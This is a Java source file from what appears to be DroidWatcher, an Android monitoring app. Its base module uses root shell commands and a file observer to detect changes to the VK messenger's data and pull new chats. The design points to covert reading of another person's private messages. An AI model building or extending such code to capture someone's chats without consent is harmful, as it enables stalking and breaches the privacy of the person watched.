package com.droidwatcher.modules.vk;

import java.util.Calendar;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;
import android.util.SparseArray;

import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.stericson.RootTools.execution.CommandCapture;

public abstract class VkModuleBase {
	protected static final String SETTINGS_LASTDATE = "lastdate";
	
	protected Context mContext;
	protected SettingsManager mSettings;
	protected FileObserver mFileObserver;
	
	protected SparseArray<String> mUsernames;
	protected long mLastMsgTimestamp;
	protected boolean mIsStarted;
	
	public VkModuleBase(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new SparseArray<String>();
		this.mIsStarted = false;
	}
	
	public boolean isStarted(){
		return mIsStarted;
	}
	
	public abstract void start();
	public abstract void stop();
	
	protected abstract void getNewChat();
	
	protected synchronized void saveLastMsgTimestamp(long lastMsgTimestamp){
		if (lastMsgTimestamp == 0) {
			return;
		}
		
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		Editor editor = settings.edit();
		editor.putLong(SETTINGS_LASTDATE, lastMsgTimestamp);
		editor.commit();
	}
	
	protected Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}

	protected class MyCommandCapture extends CommandCapture{
		private ICommandCallback callback;
		
		public MyCommandCapture(String... command){
			super(0, command);
		}
		
		public void setCallback(ICommandCallback callback){
			this.callback = callback;
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			if (callback != null) {
				callback.run();
			}
		}
	}
	
	protected interface ICommandCallback{
		public void run();
	}
	
	protected class VkFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 2 * 1000L;
		
		private long lastUpdate;

		public VkFileObserver(String filePath) {
			super(filePath, FileObserver.CLOSE_WRITE);
		}

		@Override
		public synchronized void onEvent(int event, String path) {
			Debug.i("onEvent: " + event + "; Path: " + path);
			
			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT) {
				return;
			}

			lastUpdate = now;

			new Thread(new Runnable() {
				@Override
				public void run() {
//					try {
//						Thread.sleep(UPDATE_TIOMEOUT);
//					} catch (InterruptedException e) {
//						e.printStackTrace();
//					}

					getNewChat();
				}
			}).start();

		}
	}
}
